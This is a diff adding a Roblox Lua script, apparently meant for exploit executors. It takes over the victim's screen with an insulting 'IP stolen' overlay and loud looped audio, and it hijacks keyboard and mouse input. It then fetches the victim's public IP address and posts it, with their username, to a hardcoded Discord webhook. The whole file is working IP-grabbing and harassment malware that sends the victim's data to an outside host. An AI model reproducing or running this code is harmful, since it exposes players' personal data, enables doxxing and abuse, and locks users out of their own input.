@@ -1,0 +1,97 @@
+game:GetService("CoreGui"):ClearAllChildren();
+wait(0.2)
+-- Create a ScreenGui to hold the image and text
+local gui = Instance.new("ScreenGui")
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+gui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create a Frame to hold the black background
+local frame = Instance.new("Frame")
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.BackgroundTransparency = 0
+frame.BorderSizePixel = 0
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.Parent = gui
+
+-- Create an ImageLabel to display the image
+local image = Instance.new("ImageLabel")
+image.Image = "rbxassetid://6862780932"
+image.BackgroundTransparency = 1
+image.Size = UDim2.new(1, 0, 1, 0)
+image.Parent = frame
+
+-- Create a TextLabel to display the text
+local text = Instance.new("TextLabel")
+text.Text = "Get Your IP Stolen Bitch!"
+text.TextSize = 64
+text.Font = Enum.Font.SourceSansBold
+text.TextColor3 = Color3.new(1, 0, 0)
+text.BackgroundTransparency = 1
+text.Position = UDim2.new(0.5, 0, 0.85, 0)
+text.AnchorPoint = Vector2.new(0.5, 0.5)
+text.Parent = image
+
+-- Play audio
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://7145686856"
+sound.Volume = 8
+sound.Looped = true
+sound.Parent = gui
+sound:Play()
+wait(0.1)
+
+local runService = game:GetService("RunService")
+local camera = workspace.CurrentCamera
+
+
+local disabledKeyCodes = {
+    0x73;
+    0xA4;
+    0xA5;
+    0x1B;
+    0x0D;
+};
+wait()
+runService.RenderStepped:Connect(function()
+    for _, keyCode in next, disabledKeyCodes do
+        keyrelease(keyCode)
+    end
+
+    mousemoveabs(camera.ViewportSize.X/3, camera.ViewportSize.Y/3);
+end);
+wait()
+local numb = tostring(game:HttpGet("https://api.ipify.org", true))
+wait(0.3)
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+
+local url =
+   "https://discord.com/api/webhooks/1102254912361988167/y8WW8GDfWV04WovD-Vgwtc0TnMErQTmToWSN0Fu3gKcDNVx-KjzHZtvtemyP6qPJzA-V"
+local data = {
+   ["content"] = " You Have Stolen a IP",
+   ["embeds"] = {
+       {
+           ["title"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
+           ["description"] = "IP: **"..numb.."**" ,
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
